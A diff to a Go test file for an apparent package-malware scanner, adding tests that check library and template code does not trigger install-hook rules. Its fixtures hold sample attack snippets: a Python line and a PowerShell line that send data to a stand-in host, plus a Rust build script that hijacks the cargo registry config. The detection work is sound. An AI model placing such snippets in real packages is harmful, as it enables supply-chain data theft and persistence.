@@ -108,7 +108,7 @@ urllib.request.urlopen("https://x.example/collect?d=" + data)`,
 func TestAnalyzeBadActorBehaviors_CargoConfigPersistence(t *testing.T) {
 	ctx := &PackageContext{
 		Ecosystem: "cargo",
-		PkgbuildContent: `fn main() {
+		InstallScriptContent: `fn main() {
     std::fs::write(std::env::var("HOME").unwrap() + "/.cargo/config.toml", "[registry]\ndefault=\"evil\"");
 }`,
 	}
@@ -121,7 +121,7 @@ func TestAnalyzeBadActorBehaviors_CargoConfigPersistence(t *testing.T) {
 func TestAnalyzeBadActorBehaviors_NuGetAssemblyLoadEgress(t *testing.T) {
 	ctx := &PackageContext{
 		Ecosystem: "nuget",
-		PkgbuildContent: `Install-Package x
+		InstallScriptContent: `Install-Package x
 [System.Reflection.Assembly]::Load($bytes)
 Invoke-WebRequest -Uri https://x.example/c -Method POST -Body $d`,
 	}
@@ -208,4 +208,32 @@ func behIDs(f []Finding) []string {
 		out = append(out, x.ID)
 	}
 	return out
+}
+
+// A crate's library code is not its build script: a cargo tool that documents the config path in one
+// file and writes a file in another must not read as build.rs persistence. Only build.rs (the hook) is.
+func TestAnalyzeBadActorBehaviors_CargoConfigInLibraryDoesNotFire(t *testing.T) {
+	ctx := &PackageContext{
+		Ecosystem: "cargo",
+		PkgbuildContent: `/// Reads registry settings from ~/.cargo/config.toml.
+pub fn load() -> Config { todo!() }
+pub fn save(p: &Path, s: &str) { std::fs::write(p, s).unwrap() }`,
+		InstallScriptContent: `fn main() { println!("cargo:rerun-if-changed=build.rs"); }`,
+	}
+	if f := analyzeBadActorBehaviors(ctx); behHas(f, "CARGO-CONFIG-PERSISTENCE") {
+		t.Fatalf("library code fired the build.rs rule: %v", behIDs(f))
+	}
+}
+
+// A project template ships test code that loads assemblies and uses HttpClient under content/; it
+// never runs at restore. Only the install scripts and MSBuild targets (the hook) are in scope.
+func TestAnalyzeBadActorBehaviors_NuGetLoadEgressOutsideHookDoesNotFire(t *testing.T) {
+	ctx := &PackageContext{
+		Ecosystem: "nuget",
+		PkgbuildContent: `System.Reflection.Assembly.Load($"{RootNamespace}.{layer}");
+var client = new HttpClient(); await client.PostAsync("https://api.example/todos", body);`,
+	}
+	if f := analyzeBadActorBehaviors(ctx); behHas(f, "NUGET-ASSEMBLYLOAD-EGRESS") {
+		t.Fatalf("runtime/template code fired the install-hook rule: %v", behIDs(f))
+	}
 }
